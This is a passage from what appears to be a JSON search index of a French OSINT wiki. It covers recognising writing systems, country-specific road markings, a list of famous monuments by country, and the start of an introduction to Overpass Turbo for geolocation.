Europe de l'Est et en Asie du Nord/Centrale. L'apparence varie l\u00e9g\u00e8rement selon la langue.</p> <ul> <li> <p>Russe : \u0413\u0434\u0435 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0432\u043e\u043a\u0437\u0430\u043b? (Alphabet : \u0410 \u0411 \u0412 \u0413 \u0414 \u0415 \u0401 \u0416 \u0417 \u0418 \u0419 \u041a \u041b \u041c \u041d \u041e \u041f \u0420 \u0421 \u0422 \u0423 \u0424 \u0425 \u0426 \u0427 \u0428 \u0429 \u042a \u042b \u042c \u042d \u042e \u042f)</p> </li> <li> <p>Ukrainien : \u0414\u0435 \u0437\u043d\u0430\u0445\u043e\u0434\u0438\u0442\u044c\u0441\u044f \u0432\u043e\u043a\u0437\u0430\u043b? (Lettres sp\u00e9cifiques : \u0490, \u0404, \u0406, \u0407)</p> </li> <li> <p>Bulgare : \u041a\u044a\u0434\u0435 \u0441\u0435 \u043d\u0430\u043c\u0438\u0440\u0430 \u0433\u0430\u0440\u0430\u0442\u0430? (Utilisation de \u042a comme voyelle)</p> </li> <li> <p>Serbe / Mac\u00e9donien (cyrillique) : \u0413\u0434\u0435 \u0458\u0435 \u0441\u0442\u0430\u043d\u0438\u0446\u0430? / \u041a\u0430\u0434\u0435 \u0435 \u0441\u0442\u0430\u043d\u0438\u0446\u0430\u0442\u0430? (Lettres sp\u00e9cifiques : \u0402, \u0408, \u0409, \u040a, \u040b, \u040f / \u0403, \u0405, \u040c)</p> </li> </ul>"},{"location":"Osint/Lieux/Langues/#c-alphabet-grec","title":"C. Alphabet Grec","text":"<ul> <li>Grec : \u03a0\u03bf\u03cd \u03b5\u03af\u03bd\u03b1\u03b9 \u03bf \u03c3\u03c4\u03b1\u03b8\u03bc\u03cc\u03c2; (Alphabet : \u0391 \u0392 \u0393 \u0394 \u0395 \u0396 \u0397 \u0398 \u0399 \u039a \u039b \u039c \u039d \u039e \u039f \u03a0 \u03a1 \u03a3 \u03a4 \u03a5 \u03a6 \u03a7 \u03a8 \u03a9)</li> </ul>"},{"location":"Osint/Lieux/Langues/#d-ecriture-arabe","title":"D. \u00c9criture Arabe","text":"<p>\u00c9criture de droite \u00e0 gauche, lettres li\u00e9es, aspect cursif. Utilis\u00e9e pour l'arabe, le persan, l'ourdou, etc. (avec variations).</p> <ul> <li> <p>Arabe : \u0623\u064a\u0646 \u0647\u064a \u0627\u0644\u0645\u062d\u0637\u0629\u061f (Ayna hiya al-ma\u1e25a\u1e6d\u1e6dah?)</p> </li> <li> <p>Persan : \u0627\u06cc\u0633\u062a\u06af\u0627\u0647 \u06a9\u062c\u0627\u0633\u062a\u061f (Istg\u00e2h koj\u00e2st?) (Lettres additionnelles : \u067e, \u0686, \u0698, \u06af)</p> </li> </ul>"},{"location":"Osint/Lieux/Langues/#e-ecriture-hebraique","title":"E. \u00c9criture H\u00e9bra\u00efque","text":"<p>\u00c9criture de droite \u00e0 gauche, lettres carr\u00e9es.</p> <ul> <li>H\u00e9breu : \u05d0\u05d9\u05e4\u05d4 \u05d4\u05ea\u05d7\u05e0\u05d4? (Eifo ha-ta\u1e25anah?)</li> </ul>"},{"location":"Osint/Lieux/Langues/#f-ecritures-indiennes-exemple-devanagari","title":"F. \u00c9critures Indiennes (Exemple : Devanagari)","text":"<p>Grande vari\u00e9t\u00e9 de scripts. Le Devanagari (Hindi, Marathi, Nepali...) est reconnaissable \u00e0 sa ligne horizontale sup\u00e9rieure reliant les lettres.</p> <ul> <li>Hindi (Devanagari) : \u0938\u094d\u091f\u0947\u0936\u0928 \u0915\u0939\u093e\u0901 \u0939\u0948? (Ste\u015ban kah\u0101\u1e41 hai?)</li> </ul>"},{"location":"Osint/Lieux/Langues/#g-ecritures-est-asiatiques","title":"G. \u00c9critures Est-Asiatiques","text":"<ul> <li> <p>Chinois (Simplifi\u00e9) : \u8f66\u7ad9\u5728\u54ea\u91cc\uff1f (Ch\u0113zh\u00e0n z\u00e0i n\u01cel\u01d0?) (Caract\u00e8res complexes, un caract\u00e8re = une syllabe/un mot)</p> </li> <li> <p>Japonais : \u99c5\u306f\u3069\u3053\u3067\u3059\u304b\uff1f (Eki wa doko desu ka?) (M\u00e9lange de trois \u00e9critures : Kanji (caract\u00e8res chinois), Hiragana (syllabaire pour mots japonais), Katakana (syllabaire pour mots \u00e9trangers/emphase))</p> </li> <li> <p>Cor\u00e9en (Hangul) : \uc5ed\uc774 \uc5b4\ub514\uc608\uc694? (Yeog-i eodiyeyo?) (Alphabet unique o\u00f9 les lettres sont group\u00e9es en blocs syllabiques)</p> </li> </ul>"},{"location":"Osint/Lieux/Langues/#h-autres-systemes-decriture-notables","title":"H. Autres Syst\u00e8mes d'\u00c9criture Notables","text":"<p>Il existe de nombreux autres syst\u00e8mes d'\u00e9criture distinctifs : G\u00e9orgien (\u10db\u10ee\u10d4\u10d3\u10e0\u10e3\u10da\u10d8), Arm\u00e9nien (\u0570\u0561\u0575\u0565\u0580\u0565\u0576), Tha\u00ef (\u0e44\u0e17\u0e22), Lao (\u0ea5\u0eb2\u0ea7), Khmer (\u1781\u17d2\u1798\u17c2\u179a), \u00c9thiopien (\u130d\u12d5\u12dd), etc., chacun avec ses propres caract\u00e9ristiques visuelles uniques.</p>"},{"location":"Osint/Lieux/Langues/#3-conseils-pour-la-reconnaissance","title":"3. Conseils pour la Reconnaissance","text":"<ul> <li> <p>Focalisez sur les Diacritiques : La pr\u00e9sence de \u00f1 pointe vers l'espagnol, \u00e7 vers le fran\u00e7ais/portugais/turc, \u0142 vers le polonais, \u0159 vers le tch\u00e8que, etc.</p> </li> <li> <p>Rep\u00e9rez les Lettres Uniques : \u00df (allemand), \u00e5/\u00e4/\u00f6/\u00f8/\u00e6 (nordique), \u016f (tch\u00e8que), \u0131/\u011f (turc), \u044a/\u044b/\u044d (russe)...</p> </li> <li> <p>Analysez la Fr\u00e9quence des Lettres/Combinaisons : \"sz\", \"cz\" (polonais), doubles voyelles (finnois, n\u00e9erlandais), absence de certaines lettres (ex: peu de K/W/Y en italien).</p> </li> <li> <p>Observez la Forme G\u00e9n\u00e9rale : L'aspect cursif li\u00e9 de l'arabe, la ligne sup\u00e9rieure du Devanagari, les blocs carr\u00e9s du Hangul cor\u00e9en sont tr\u00e8s reconnaissables.</p> </li> </ul>"},{"location":"Osint/Lieux/Langues/#4-application-osint","title":"4. Application OSINT","text":"<ul> <li> <p>Localisation : La langue est souvent le premier indice pour d\u00e9terminer un pays ou une r\u00e9gion.</p> </li> <li> <p>Recherche d'Informations : Permet de rechercher des noms de lieux, de personnes ou d'entreprises dans la langue locale sur les moteurs de recherche, les r\u00e9seaux sociaux, les annuaires.</p> </li> <li> <p>Compr\u00e9hension du Contexte : Identifier la langue aide \u00e0 comprendre la culture locale, les influences politiques ou historiques.</p> </li> </ul>"},{"location":"Osint/Lieux/Marquage%20au%20sol/","title":"Marquage au sol","text":"<p>Le marquage au sol constitue l'un des indices visuels les plus fiables et les plus omnipr\u00e9sents pour la g\u00e9olocalisation. Bien que la Convention de Vienne de 1968 sur la signalisation routi\u00e8re ait tent\u00e9 d'harmoniser les pratiques, de nombreux pays (y compris de grands pays comme les \u00c9tats-Unis, le Canada, l'Australie) ne l'ont pas ratifi\u00e9e ou appliquent des variations significatives. Ces diff\u00e9rences sont pr\u00e9cieuses pour l'OSINT.</p>"},{"location":"Osint/Lieux/Marquage%20au%20sol/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Couleur des Lignes : Blanc, jaune, rouge, bleu, vert ?</p> </li> <li> <p>Type de Lignes : Continues, discontinues (pointill\u00e9s), mixtes ? Simples ou doubles ?</p> </li> <li> <p>Largeur des Lignes : Standard, larges (souvent pour les bords ou voies sp\u00e9ciales) ?</p> </li> <li> <p>Marquages Sp\u00e9ciaux : Passages pi\u00e9tons, fl\u00e8ches, lettres, symboles, zones hachur\u00e9es ?</p> </li> <li> <p>Mat\u00e9riau et R\u00e9flectivit\u00e9 : Peinture simple, enduit thermoplastique (plus \u00e9pais), pr\u00e9sence de plots r\u00e9fl\u00e9chissants (\"yeux de chat\") ?</p> </li> </ul>"},{"location":"Osint/Lieux/Marquage%20au%20sol/#2-le-code-couleur","title":"2. Le Code Couleur","text":"<ul> <li> <p>Blanc :</p> <ul> <li> <p>Usage : Le plus courant mondialement, surtout dans les pays suivant la Convention de Vienne (majorit\u00e9 de l'Europe).</p> </li> <li> <p>Signification typique : Lignes de rive (bords de chauss\u00e9e), s\u00e9paration de voies de m\u00eame sens, lignes discontinues pour l'axe central (si d\u00e9passement autoris\u00e9 des deux c\u00f4t\u00e9s), passages pi\u00e9tons, lignes d'arr\u00eat, fl\u00e8ches directionnelles.</p> </li> </ul> </li> <li> <p>Jaune :</p> <ul> <li> <p>Usage : Tr\u00e8s courant en Am\u00e9rique du Nord (USA, Canada), Australie, Nouvelle-Z\u00e9lande, Japon, Norv\u00e8ge, parfois Suisse.</p> </li> <li> <p>Signification typique :</p> <ul> <li> <p>Axe central : S\u00e9pare les sens de circulation oppos\u00e9s. Une double ligne jaune continue interdit le d\u00e9passement dans les deux sens. Une ligne jaune continue + une discontinue autorise le d\u00e9passement du c\u00f4t\u00e9 de la discontinue. Une ligne jaune discontinue autorise le d\u00e9passement (si la voie est libre).</p> </li> <li> <p>Marquage temporaire : En Europe, le jaune prime sur le blanc pour les marquages de travaux.</p> </li> <li> <p>Restrictions de stationnement : Lignes jaunes sur le bord de la chauss\u00e9e (ex: UK, Irlande).</p> </li> <li> <p>Voies de bus : Parfois.</p> </li> </ul> </li> </ul> </li> <li> <p>Rouge :</p> <ul> <li> <p>Usage : Moins fr\u00e9quent.</p> </li> <li> <p>Signification typique : Interdiction formelle d'arr\u00eat ou de stationnement (bordures de trottoir peintes en rouge aux USA), voies de bus (ex: Londres), zones sp\u00e9cifiques \u00e0 ne pas bloquer.</p> </li> </ul> </li> <li> <p>Bleu :</p> <ul> <li> <p>Usage : Rare pour les lignes, plus courant pour les symboles.</p> </li> <li> <p>Signification typique : Places de stationnement r\u00e9serv\u00e9es aux personnes handicap\u00e9es.</p> </li> </ul> </li> <li> <p>Vert :</p> <ul> <li> <p>Usage : Tr\u00e8s rare pour les lignes de circulation g\u00e9n\u00e9rale.</p> </li> <li> <p>Signification typique : Parfois utilis\u00e9 pour les pistes cyclables ou des zones de guidage sp\u00e9cifiques.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Marquage%20au%20sol/#3-types-de-lignes-et-leur-signification","title":"3. Types de Lignes et Leur Signification","text":"<ul> <li> <p>Ligne Continue Simple/Double : Interdiction de franchissement (sauf exceptions sp\u00e9cifiques comme tourner pour entrer dans une propri\u00e9t\u00e9). Tr\u00e8s utilis\u00e9e pour les lignes de rive (simple) ou l'axe central (simple ou double).</p> </li> <li> <p>Ligne Discontinue (Pointill\u00e9s) : Franchissement autoris\u00e9. Utilis\u00e9e pour s\u00e9parer les voies de m\u00eame sens ou l'axe central si le d\u00e9passement est permis. La longueur des traits et des espaces peut varier significativement entre les pays.</p> </li> <li> <p>Ligne Mixte (Continue + Discontinue) : Voir signification du jaune/blanc ci-dessus. Le c\u00f4t\u00e9 qui peut franchir est celui de la ligne discontinue.</p> </li> <li> <p>Lignes Larges : Souvent utilis\u00e9es pour les lignes de rive ou pour d\u00e9limiter des voies sp\u00e9ciales (bus, v\u00e9lo, sortie).</p> </li> <li> <p>Bandes Rugueuses (Rumble Strips) : Bandes textur\u00e9es ou frais\u00e9es sur les lignes de rive ou centrales pour alerter les conducteurs par vibration/bruit. Leur design (forme, espacement) peut varier.</p> </li> </ul>"},{"location":"Osint/Lieux/Marquage%20au%20sol/#4-marquages-specifiques","title":"4. Marquages Sp\u00e9cifiques","text":"<ul> <li> <p>Passages Pi\u00e9tons :</p> <ul> <li> <p>Z\u00e9brures (Europe continentale) : Larges bandes blanches parall\u00e8les au sens de la marche.</p> </li> <li> <p>Lignes parall\u00e8les (USA/Canada) : Deux lignes blanches parall\u00e8les d\u00e9limitant la zone de travers\u00e9e.</p> </li> <li> <p>\u00c9chelle (Ladder - UK/Irlande/Australie...) : Bandes larges perpendiculaires au sens de la marche.</p> </li> <li> <p>Couleurs : Parfois jaunes (Chine, certains pays d'Am. Latine).</p> </li> <li> <p>Marques d'approche : Lignes en zigzag (UK/Irlande), losanges (Japon, USA/Canada).</p> </li> </ul> </li> <li> <p>Lignes d'Arr\u00eat (Stop) : Ligne blanche continue \u00e9paisse, perpendiculaire \u00e0 la voie, avant une intersection ou un panneau STOP.</p> </li> <li> <p>Lignes de \"C\u00e9dez le Passage\" (Yield/Give Way) :</p> <ul> <li> <p>Triangles Pointant vers le Conducteur : Tr\u00e8s courant en Europe (Convention de Vienne).</p> </li> <li> <p>Ligne Discontinue Large : Alternative dans certains pays.</p> </li> </ul> </li> <li> <p>Fl\u00e8ches Directionnelles : Indiquent les directions autoris\u00e9es pour chaque voie. Leur style (forme de la pointe, \u00e9paisseur) varie grandement.</p> </li> <li> <p>Inscriptions au Sol :</p> <ul> <li> <p>\"STOP\", \"BUS\", \"TAXI\", \"SCHOOL\", limitations de vitesse, noms de villes/sorties.</p> </li> <li> <p>La police de caract\u00e8res et la langue sont des indices cruciaux.</p> </li> </ul> </li> <li> <p>Zones Hachur\u00e9es / Chevrons : Indiquent des zones o\u00f9 il est interdit de circuler ou de stationner. L'orientation et l'espacement des hachures peuvent varier.</p> </li> <li> <p>Box Junctions (Carrefours \u00e0 Grille Jaune) : Grille de lignes jaunes (parfois blanches) interdisant d'entrer dans le carrefour si la sortie n'est pas libre. Typique du Royaume-Uni, Irlande, Malte, Singapour, Hong Kong...</p> </li> <li> <p>Pistes Cyclables : Souvent d\u00e9limit\u00e9es par des lignes (blanches, parfois vertes/rouges) et un symbole de v\u00e9lo. Le design du symbole varie.</p> </li> </ul>"},{"location":"Osint/Lieux/Marquage%20au%20sol/#5-exemples-de-variations-regionales-notables","title":"5. Exemples de Variations R\u00e9gionales Notables","text":"<ul> <li> <p>Am\u00e9rique du Nord (USA/Canada) : Jaune pour l'axe central, blanc pour le reste. Style de fl\u00e8ches et de lettrage assez standardis\u00e9 (\"Highway Gothic\" / \"Clearview\"). Passages pi\u00e9tons souvent d\u00e9limit\u00e9s par deux lignes.</p> </li> <li> <p>Europe (Influence Convention de Vienne) : Majoritairement blanc. Grande vari\u00e9t\u00e9 dans les passages pi\u00e9tons (z\u00e9br\u00e9s fr\u00e9quents). Triangles pour c\u00e9der le passage. Le marquage temporaire (travaux) est jaune.</p> </li> <li> <p>Royaume-Uni / Irlande : Conduite \u00e0 gauche. Lignes en zigzag avant passages pi\u00e9tons. Box junctions jaunes. Doubles lignes rouges = interdiction d'arr\u00eat. Lignes centrales souvent blanches.</p> </li> <li> <p>Australie / Nouvelle-Z\u00e9lande : Conduite \u00e0 gauche. Souvent jaune pour l'axe central (similaire Am. Nord). Styles de passages pi\u00e9tons et fl\u00e8ches sp\u00e9cifiques.</p> </li> <li> <p>Japon : Conduite \u00e0 gauche. Jaune fr\u00e9quent pour l'axe central. Losanges peints au sol \u00e0 l'approche des passages pi\u00e9tons. Feux de circulation souvent avec fond noir et contour blanc.</p> </li> </ul>"},{"location":"Osint/Lieux/Marquage%20au%20sol/#6-application-osint","title":"6. Application OSINT","text":"<ul> <li> <p>Filtrage Rapide : La couleur de l'axe central (jaune vs blanc) permet souvent une premi\u00e8re distinction majeure (Am\u00e9riques/Oc\u00e9anie/Japon vs Europe).</p> </li> <li> <p>Indices Sp\u00e9cifiques : Un box junction jaune pointe fortement vers le UK/Irlande. Des triangles pour c\u00e9der le passage pointent vers l'Europe continentale.</p> </li> <li> <p>Corroboration : Utilisez le marquage au sol en conjonction avec les panneaux, la langue, l'architecture, la v\u00e9g\u00e9tation pour confirmer une localisation.</p> </li> <li> <p>Recherche Cibl\u00e9e : Une fois une r\u00e9gion suspect\u00e9e, recherchez des guides officiels de marquage routier du pays ou de l'\u00e9tat (\"road markings [country/state name]\") pour comparer les d\u00e9tails fins (style des fl\u00e8ches, passages pi\u00e9tons...).</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/","title":"Monuments","text":"<p>Les monuments et sites c\u00e9l\u00e8bres sont des points d'ancrage visuels essentiels pour l'identification de lieux en OSINT et GeoGuessr. Les plus iconiques permettent une localisation quasi instantan\u00e9e. Reconna\u00eetre des sites moins universellement connus demande plus de pratique et de connaissances r\u00e9gionales. Cette liste pr\u00e9sente des exemples marquants par pays, incluant des structures architecturales et des sites naturels embl\u00e9matiques.</p>"},{"location":"Osint/Lieux/Monuments/#europe","title":"Europe","text":""},{"location":"Osint/Lieux/Monuments/#france","title":"France","text":"<ul> <li> <p>Tour Eiffel (Paris) </p> </li> <li> <p>Arc de Triomphe (Paris) </p> </li> <li> <p>Cath\u00e9drale Notre-Dame de Paris (Paris)</p> </li> <li> <p>Mont Saint-Michel (Normandie) </p> </li> <li> <p>Ch\u00e2teau de Versailles (\u00cele-de-France)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#royaume-uni","title":"Royaume-Uni","text":"<ul> <li> <p>Palais de Westminster &amp; Big Ben (Londres) </p> </li> <li> <p>Tower Bridge (Londres) </p> </li> <li> <p>Stonehenge (Wiltshire, Angleterre) </p> </li> <li> <p>Buckingham Palace (Londres)</p> </li> <li> <p>Ch\u00e2teau d'\u00c9dimbourg (\u00c9cosse)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#italie","title":"Italie","text":"<ul> <li> <p>Colis\u00e9e (Rome) </p> </li> <li> <p>Tour de Pise (Pise) </p> </li> <li> <p>D\u00f4me (Duomo) de Florence (Florence)</p> </li> <li> <p>Basilique Saint-Pierre &amp; Place Saint-Pierre (Vatican / Rome)</p> </li> <li> <p>Canaux et Pont du Rialto (Venise)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#espagne","title":"Espagne","text":"<ul> <li> <p>Sagrada Fam\u00edlia (Barcelone) </p> </li> <li> <p>Alhambra (Grenade) </p> </li> <li> <p>Aqueduc de S\u00e9govie (S\u00e9govie)</p> </li> <li> <p>Plaza Mayor (Madrid)</p> </li> <li> <p>Mosqu\u00e9e-Cath\u00e9drale de Cordoue (Cordoue)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#allemagne","title":"Allemagne","text":"<ul> <li> <p>Porte de Brandebourg (Berlin) </p> </li> <li> <p>B\u00e2timent du Reichstag (Berlin)</p> </li> <li> <p>Ch\u00e2teau de Neuschwanstein (Bavi\u00e8re)</p> </li> <li> <p>Cath\u00e9drale de Cologne (Cologne)</p> </li> <li> <p>M\u00e9morial de l'Holocauste (Berlin)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#grece","title":"Gr\u00e8ce","text":"<ul> <li> <p>Acropole &amp; Parth\u00e9non (Ath\u00e8nes)</p> </li> <li> <p>Monast\u00e8res des M\u00e9t\u00e9ores (Thessalie) </p> </li> <li> <p>Architecture des Cyclades (Santorin, Mykonos - maisons blanches, d\u00f4mes bleus) </p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#russie","title":"Russie","text":"<ul> <li> <p>Place Rouge, Cath\u00e9drale Saint-Basile &amp; Kremlin (Moscou) </p> </li> <li> <p>Mus\u00e9e de l'Ermitage / Palais d'Hiver (Saint-P\u00e9tersbourg)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#autres-pays-europeens-notables","title":"Autres pays europ\u00e9ens notables","text":"<ul> <li> <p>Portugal : Tour de Bel\u00e9m, Monast\u00e8re des Hi\u00e9ronymites (Lisbonne)</p> </li> <li> <p>Belgique : Atomium, Grand-Place (Bruxelles)</p> </li> <li> <p>Pays-Bas : Moulins de Kinderdijk, Canaux d'Amsterdam</p> </li> <li> <p>Autriche : Palais de Sch\u00f6nbrunn, Cath\u00e9drale Saint-\u00c9tienne (Vienne)</p> </li> <li> <p>R\u00e9publique Tch\u00e8que : Pont Charles, Horloge Astronomique (Prague)</p> </li> <li> <p>Irlande : Falaises de Moher, Trinity College (Dublin)</p> </li> <li> <p>Suisse : Jet d'eau (Gen\u00e8ve), Cervin/Matterhorn (montagne)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#amerique-du-nord","title":"Am\u00e9rique du Nord","text":""},{"location":"Osint/Lieux/Monuments/#etats-unis","title":"\u00c9tats-Unis","text":"<ul> <li> <p>Statue de la Libert\u00e9 (New York) </p> </li> <li> <p>Empire State Building / Skyline de Manhattan (New York)</p> </li> <li> <p>Maison Blanche &amp; Capitole (Washington D.C.)</p> </li> <li> <p>Golden Gate Bridge (San Francisco)</p> </li> <li> <p>Mont Rushmore (Dakota du Sud) </p> </li> <li> <p>Hollywood Sign (Los Angeles)</p> </li> <li> <p>Grand Canyon (Arizona - site naturel) </p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#canada","title":"Canada","text":"<ul> <li> <p>Tour CN (Toronto) </p> </li> <li> <p>Chutes du Niagara (Ontario - partag\u00e9 avec les USA)</p> </li> <li> <p>Colline du Parlement (Ottawa)</p> </li> <li> <p>Vieux-Qu\u00e9bec &amp; Ch\u00e2teau Frontenac (Qu\u00e9bec) </p> </li> <li> <p>Parc National de Banff / Lac Louise (Alberta - site naturel)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#mexique","title":"Mexique","text":"<ul> <li> <p>Chich\u00e9n Itz\u00e1 (Yucat\u00e1n) </p> </li> <li> <p>Pyramides de Teotihuac\u00e1n (pr\u00e8s de Mexico)</p> </li> <li> <p>Z\u00f3calo (Place de la Constitution) (Mexico)</p> </li> <li> <p>Palenque (Chiapas)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#amerique-du-sud","title":"Am\u00e9rique du Sud","text":""},{"location":"Osint/Lieux/Monuments/#bresil","title":"Br\u00e9sil","text":"<ul> <li> <p>Christ R\u00e9dempteur (Rio de Janeiro) </p> </li> <li> <p>Pain de Sucre (Rio de Janeiro)</p> </li> <li> <p>Chutes d'Igua\u00e7u (Paran\u00e1 - partag\u00e9 avec l'Argentine) </p> </li> <li> <p>Congr\u00e8s National du Br\u00e9sil (Brasilia - architecture d'Oscar Niemeyer)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#perou","title":"P\u00e9rou","text":"<ul> <li> <p>Machu Picchu (Andes) </p> </li> <li> <p>Lignes de Nazca (D\u00e9sert de Nazca)</p> </li> <li> <p>Lac Titicaca (partag\u00e9 avec la Bolivie - site naturel/culturel)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#argentine","title":"Argentine","text":"<ul> <li> <p>Ob\u00e9lisque de Buenos Aires (Buenos Aires)</p> </li> <li> <p>Glacier Perito Moreno (Patagonie - site naturel) </p> </li> <li> <p>Recoleta Cemetery (Buenos Aires)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#chili","title":"Chili","text":"<ul> <li> <p>Moa\u00ef de l'\u00cele de P\u00e2ques (Rapa Nui) </p> </li> <li> <p>D\u00e9sert d'Atacama (site naturel)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#asie","title":"Asie","text":""},{"location":"Osint/Lieux/Monuments/#chine","title":"Chine","text":"<ul> <li> <p>Grande Muraille de Chine </p> </li> <li> <p>Cit\u00e9 Interdite (P\u00e9kin)</p> </li> <li> <p>Arm\u00e9e de terre cuite (Xi'an)</p> </li> <li> <p>Le Bund &amp; Skyline de Pudong (Shanghai)</p> </li> <li> <p>Palais du Potala (Lhassa, Tibet)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#japon","title":"Japon","text":"<ul> <li> <p>Mont Fuji (Honshu - site naturel/culturel) </p> </li> <li> <p>Kinkaku-ji (Pavillon d'Or) (Kyoto)</p> </li> <li> <p>Tour de Tokyo &amp; Tokyo Skytree (Tokyo)</p> </li> <li> <p>Torii flottant du Sanctuaire d'Itsukushima (Miyajima) </p> </li> <li> <p>Shibuya Crossing (Tokyo)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#inde","title":"Inde","text":"<ul> <li> <p>Taj Mahal (Agra) </p> </li> <li> <p>Fort Rouge (Delhi)</p> </li> <li> <p>Porte de l'Inde (Mumbai et Delhi - deux monuments diff\u00e9rents)</p> </li> <li> <p>Temple d'Or (Harmandir Sahib) (Amritsar)</p> </li> <li> <p>Gange &amp; Ghats de Varanasi (Varanasi)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#egypte-afriquemoyen-orient","title":"\u00c9gypte (Afrique/Moyen-Orient)","text":"<ul> <li> <p>Pyramides de Gizeh &amp; Sphinx (Le Caire) </p> </li> <li> <p>Temples de Louxor &amp; Karnak (Louxor)</p> </li> <li> <p>Abou Simbel (Nubie)</p> </li> <li> <p>Vall\u00e9e des Rois (Louxor)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#autres-pays-asiatiques-notables","title":"Autres pays asiatiques notables","text":"<ul> <li> <p>Cambodge : Angkor Wat, Bayon (Angkor Thom) </p> </li> <li> <p>Cor\u00e9e du Sud : Palais Gyeongbokgung, Tour N de S\u00e9oul (S\u00e9oul)</p> </li> <li> <p>Tha\u00eflande : Grand Palais, Wat Arun (Bangkok)</p> </li> <li> <p>Vietnam : Baie d'Along (site naturel), Mausol\u00e9e de H\u00f4 Chi Minh (Hano\u00ef)</p> </li> <li> <p>Turquie : Sainte-Sophie, Mosqu\u00e9e Bleue (Istanbul), Cappadoce (site naturel/culturel)</p> </li> <li> <p>\u00c9mirats Arabes Unis : Burj Khalifa, Burj Al Arab (Duba\u00ef)</p> </li> <li> <p>Jordanie : P\u00e9tra </p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#oceanie","title":"Oc\u00e9anie","text":""},{"location":"Osint/Lieux/Monuments/#australie","title":"Australie","text":"<ul> <li> <p>Op\u00e9ra de Sydney (Sydney) </p> </li> <li> <p>Harbour Bridge (Sydney)</p> </li> <li> <p>Uluru (Ayers Rock) (Territoire du Nord - site naturel/culturel) </p> </li> <li> <p>Grande Barri\u00e8re de Corail (Queensland - site naturel)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#nouvelle-zelande","title":"Nouvelle-Z\u00e9lande","text":"<ul> <li> <p>Sky Tower (Auckland)</p> </li> <li> <p>Sites naturels embl\u00e9matiques : Fiordland (Milford Sound), Mont Cook/Aoraki, Tongariro Alpine Crossing, Rotorua (g\u00e9othermie).</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#afrique-hors-egypte","title":"Afrique (hors \u00c9gypte)","text":""},{"location":"Osint/Lieux/Monuments/#afrique-du-sud","title":"Afrique du Sud","text":"<ul> <li> <p>Montagne de la Table (Table Mountain) (Le Cap) </p> </li> <li> <p>Union Buildings (Pretoria)</p> </li> <li> <p>Voortrekker Monument (Pretoria)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#maroc","title":"Maroc","text":"<ul> <li> <p>Place Jemaa el-Fna (Marrakech)</p> </li> <li> <p>Mosqu\u00e9e Hassan II (Casablanca)</p> </li> <li> <p>M\u00e9dina de F\u00e8s (F\u00e8s)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#autres-pays-africains-notables","title":"Autres pays africains notables","text":"<ul> <li> <p>Tanzanie : Mont Kilimandjaro (site naturel) </p> </li> <li> <p>Zimbabwe / Zambie : Chutes Victoria (site naturel) </p> </li> <li> <p>Mali : Grande Mosqu\u00e9e de Djenn\u00e9 (architecture en terre) </p> </li> <li> <p>\u00c9thiopie : \u00c9glises rupestres de Lalibela</p> </li> <li> <p>S\u00e9n\u00e9gal : Monument de la Renaissance Africaine (Dakar)</p> </li> </ul>"},{"location":"Osint/Lieux/Monuments/#application-osint","title":"Application OSINT","text":"<ul> <li> <p>Ancrage Primaire : Les monuments tr\u00e8s c\u00e9l\u00e8bres permettent une identification imm\u00e9diate du pays et souvent de la ville.</p> </li> <li> <p>Recherche Visuelle : Pour les monuments moins connus, une recherche d'image invers\u00e9e (Reverse Image Search) ou une recherche par mots-cl\u00e9s d\u00e9crivant l'architecture ou les caract\u00e9ristiques peut \u00eatre efficace.</p> </li> <li> <p>Confirmation : Utiliser les monuments visibles pour confirmer une hypoth\u00e8se bas\u00e9e sur d'autres indices (langue, plaques, v\u00e9g\u00e9tation...). Comparer avec des cartes (Google Maps, OpenStreetMap), des guides touristiques, des photos panoramiques (360cities...).</p> </li> <li> <p>Style Architectural : M\u00eame sans reconna\u00eetre LE monument exact, identifier le style architectural g\u00e9n\u00e9ral (ex: colonial espagnol, sovi\u00e9tique, islamique...) aide \u00e0 cibler la r\u00e9gion.</p> </li> </ul>"},{"location":"Osint/Lieux/Overpass-turbo/","title":"Overpass turbo","text":""},{"location":"Osint/Lieux/Overpass-turbo/#introduction","title":"Introduction","text":"<p>Overpass Turbo (https://overpass-turbo.eu/) est une interface web permettant d'interroger la base de donn\u00e9es OpenStreetMap (OSM) via l'API Overpass. Elle permet de rechercher des objets cartographiques (points, lignes, zones) tr\u00e8s sp\u00e9cifiques en fonction de leurs tags (\u00e9tiquettes <code>cl\u00e9=valeur</code>). C'est un outil puissant pour la g\u00e9olocalisation et la collecte d'informations sur une zone.</p>"},{"location":"Osint/Lieux/Overpass-turbo/#interface-principale","title":"Interface Principale","text":"<ul> <li>Carte : Affiche les r\u00e9sultats de la requ\u00eate. La zone visible d\u00e9finit souvent la zone de recherche (<code>{{bbox}}</code>).</li> <li>\u00c9diteur de Requ\u00eate : Zone de texte o\u00f9 \u00e9crire votre requ\u00eate en langage Overpass QL.</li> <li>Boutons Principaux :<ul> <li>Ex\u00e9cuter : Lance la requ\u00eate sur la zone visible.</li> <li>Partager : G\u00e9n\u00e8re un lien permanent vers votre requ\u00eate 